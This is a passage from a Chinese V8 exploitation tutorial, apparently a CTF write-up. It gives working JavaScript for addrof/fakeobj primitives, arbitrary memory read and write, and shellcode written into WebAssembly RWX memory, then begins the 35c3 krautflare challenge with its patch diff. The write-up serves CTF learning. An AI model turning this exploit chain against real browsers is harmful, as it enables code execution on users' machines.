function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        a[<span class="number">0</span>] = addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">trigger</span>(evil_callback);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title function_">fake_object</span>(<span class="title function_">u2d</span>(<span class="title function_">address_of</span>(array_buffer)));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(obj);</span><br></pre></td></tr></table></figure></div>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e56933efd1535fd7f7a43936eeb26928.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h3 id="漏洞利用">漏洞利用</h3>
<p>前面漏洞分析已经构造出 address of 和 fake object
两个利用原语，因此后续利用和前面的 OOB 一致。不过需要注意的是，
<code>address_of</code> 函数在用过一次之后已经被 JIT
了，后续如果用到这个函数需要再定义一个。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of1</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of2</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        a[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">trigger</span>(evil_callback);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),               <span class="comment">// ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042317080808n</span>),   <span class="comment">// type</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">address_of1</span>(fake_ab_mem) + <span class="number">0x30n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fake_object</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake ab addr: &quot;</span>+<span class="title function_">hex</span>(fake_ab_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">address_of2</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题35c3-krautflare">例题：35c3 krautflare</h2>
<h3 id="环境搭建-2">环境搭建</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/35c3_krautflare" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/sroettger/35c3ctf_chals</span><br><span class="line">mv 35c3ctf_chals/krautflare .</span><br><span class="line">cd v8</span><br><span class="line">git checkout dde25872f58951bb0148cf43d6a504ab2f280485</span><br><span class="line">git apply ../../test/krautflare/attachments/revert-bugfix-880207.patch</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div> ### 漏洞分析 题目主要 patch 了优化的 Typer 阶段：
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index <span class="number">60e7</span>ed574a.<span class="number">.8324</span>dc06d7 <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1491</span>,<span class="number">6</span> <span class="number">+1491</span>,<span class="number">7</span> @@ Type Typer::Visitor::<span class="built_in">JSCallTyper</span>(Type fun, Typer* t) &#123;</span><br><span class="line">     <span class="comment">// Unary math functions.</span></span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAbs:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathExp:</span><br><span class="line">+    <span class="keyword">case</span> BuiltinFunctionId::kMathExpm1:</span><br><span class="line">       <span class="keyword">return</span> Type::<span class="built_in">Union</span>(Type::<span class="built_in">PlainNumber</span>(), Type::<span class="built_in">NaN</span>(), t-&gt;<span class="built_in">zone</span>());</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAcos:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAcosh:</span><br><span class="line">@@ <span class="number">-1500</span>,<span class="number">7</span> <span class="number">+1501</span>,<span class="number">6</span> @@ Type Typer::Visitor::<span class="built_in">JSCallTyper</span>(Type fun, Typer* t) &#123;</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAtanh:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathCbrt:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathCos:</span><br><span class="line">-    <span class="keyword">case</span> BuiltinFunctionId::kMathExpm1:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathFround:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathLog:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathLog1p:</span><br></pre></td></tr></table></figure></div> 原本 Typer 阶段预测 <code>kMathExpm1</code>
的返回值类型是 <code>Type::Number()</code> ，经过 patch 之后现在变成了
<code>Type::PlainNumber()</code> 或 <code>Type::NaN()</code> 。</p>
<p>在 <code>src/compiler/types.h</code> 中定义了各种数字类型的范围：
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ON    OS32     N31     U30     OU31    OU32     ON</span><br><span class="line">______[_______[_______[_______[_______[_______[_______</span><br><span class="line">    -2^31   -2^30     0      2^30    2^31    2^32</span><br></pre></td></tr></table></figure></div> - OtherNumber（ON）：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mi mathvariant="normal">∞</mi><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo stretchy="false">)</mo><mo>∪</mo><mo stretchy="false">[</mo><msup><mn>2</mn><mn>32</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(−\infin,−2^{31})\cup [2^{32},\infin)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">∞</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∞</span><span class="mclose">)</span></span></span></span> -
OtherSigned32（OS32） ：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>30</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{31},−2^{30})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> -
Negative31（N31）：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>30</mn></msup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{30},0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> - Unsigned30（U30）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><msup><mn>2</mn><mn>30</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[0,2^{30})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>
- OtherUnsigned31（OU31）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msup><mn>2</mn><mn>30</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[2^{30},2^{31})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> - OtherUnsigned32（OU32）:
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>32</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[2^{31},2^{32})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> - Integral32：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>32</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{31},2^{32})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span 